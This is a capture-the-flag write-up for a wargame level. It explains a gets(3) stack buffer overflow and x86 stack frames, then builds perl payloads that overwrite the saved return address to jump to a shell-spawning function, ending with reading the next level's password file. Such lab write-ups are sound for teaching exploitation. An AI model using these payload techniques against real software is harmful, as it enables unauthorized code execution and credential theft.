# level1

Pull executable:

```sh
sshpass -f ../level0/flag scp level1@rainfall
```

Check `source.c` for source code reconstitution.

This program uses `gets(3)`, which has been deprecated since C99 and removed in subsequent standards.  The manual page even says _`Never use this function`_.  `gets` is fundamentally unsafe because it never performs bounds checking on its output buffer.

Our buffer is located on the stack.  This can be used to change the execution flow of the program in a way we, the attackers, decide.  But first, we need to understand how the call stack works on x86.

On x86, the CPU uses two registers for stack management: Extended Base Pointer (`ebp`) and Extended Stack Pointer (`esp`).  `ebp` marks the beginning of the stack frame, `esp` marks its end.  It also uses one register for instruction management: Extended Instruction Pointer (`eip`).  It represents where the CPU should read the next instruction and is automatically incremented after each instruction.

When looking at the assembly of the machine code, functions always look like this:

```asm
;; prologue
push ebp
mov  ebp, esp
sub  esp, <size>
;; end prologue


;; body...


;; epilogue
mov  esp, ebp
pop  ebp
;; end epilogue

ret
```

The prologue sets up the stack frame and can be replaced with `enter <size>, 0`.  Likewise, the epilogue clears the stack frame and can be replaced with `leave`. 

Additionally, `call` pushes `eip` onto the stack and jumps to the specified address.  `ret` pops the saved address off of the stack back into `eip`, effectively jumping to the saved address.

In summary, a stack frame should be ordered like this:

* function parameters, in reverse order
* saved `eip`
* saved `ebp`
* local variables

Also, on x86, the stack grows downwards.  It means the stack starts at higher addresses and grows to lower addresses.  Therefore, function parameters have a lower address than local variables. However, data bytes in local variables and function parameters are ordered lower to higher (e.g. `"hello world"` is ordered as we read it).

Putting everything together, we can plan the attack:

1. Figure out how many bytes there are until we reach the saved `eip`, aka offset
2. Write some address so the CPU jumps to where we want
3. Get a shell

There are several methods to get the offset for saved `eip`.  Here, we will use the GNU Debugger (GDB).

First, we need some data for `gets(3)`. Ghidra says the buffer size is 76 bytes, so we will use that as dummy input.  Then, we will add a bogus address (4 bytes on x86) and see if the crash address matches.  This will constitute our detection payload.

```sh
perl -e 'print "\xff" x 76, "\x00" x 4' > /tmp/1
hexdump -Cv /tmp/1
```

The `hexdump -Cv` commands shows us what our payload looks like: 76 `FF` bytes and 4 NUL bytes.  Now, we run the program with `gdb`:


```sh
gdb ./level1

r < /tmp/1
```

This should give us a crash caused by a segmentation fault at address `0x00000000`:

```
Starting program: /home/user/level1/level1 < /tmp/1

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

Cool.  Now we just need to replace the `NULL` address with whatever we want.  Fortunately, this program also has a `run` symbol that not used anywhere in the code and does everything we want: spawn a shell using `system(3)`.  We can get the address of `run` using `gdb`:

```
(gdb) disass run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
```

So the address of `run` is `0x08048444`.  Now, to generate the attack payload:

```
perl -e 'print "\xff" x 76, "\x08\x04\x84\x44"' > /tmp/1
```

Then run the program:

```sh
./level1 < /tmp/1
```

We get:

```
Segmentation fault (core dumped)
```

That's expected.  x86 is little endian that has the Least Significant Bit (LSB) is at the end of the value, as opposed to big endian that has the Most Significant Bit (MSB) at the end of the value.  For us, this just means we have to write address bytes (**not bits, not nibbles, bytes**) in reverse order (e.g. `0x01234567` should be written `0x67452301`).  Now we generate the correct payload:

```
perl -e 'print "\xff" x 76, "\x44\x84\x04\x08"' > /tmp/1
```

Now the address is in correct order, but it can get pretty tedious to write addresses in inverted and escaped notation every time we want to try something.  Fortunately, Perl has a neat little function called `pack`, which takes a template and values as input and returns bytes as output.  The template is a string that describes how the byte representation of the values should be arranged.  According to the documentation, `"<"` forces little endian byte order, and `"L"` transform the value into a 32-bit unsigned integer.

```
perl -e 'print "\xff" x 76, pack("L<", 0x08048444)' > /tmp/1
```

Let's run the program once again:

```sh
./level1 < /tmp/1
```

We get:

```
Good... Wait what?
Segmentation fault (core dumped)
```

It worked, but it also didn't.  We see the `Good... Wait what?` message which comes from the `run` function.  That means we made the CPU jump the the function we wanted.  But for some reason, we didn't get a shell and the program crashed.  Stepping through the instructions in `gdb` reveals that the shell did spawn and the `run` function reached its prologue and the `ret` instruction.  After ~~some~~ a lot of digging, it appears that the shell exits as soon as its standard input is closed.  We need to keep stdin open to be able to pass commands to the shell.  The `cat(1)` utility can help us with that.  From the `cat(1)` man page: `With no FILE, or when FILE is -, read standard input.`

```
cat /tmp/1 - | ./level1
```

We also need to press enter so that `gets(3)` can actually return.  From the `gets(3)` man page: `[...] shall read bytes from the standard input stream, stdin, into the array pointed to by s, until a <newline> is read or an end-of-file condition is encountered. Any <newline> shall be discarded and a null byte shall be placed immediately after the last byte read into the array.` We could also add a `\n` into the payload.

Anyway, we now have a shell connected to our terminal.  `cat ~level2/.pass` will give us the flag.
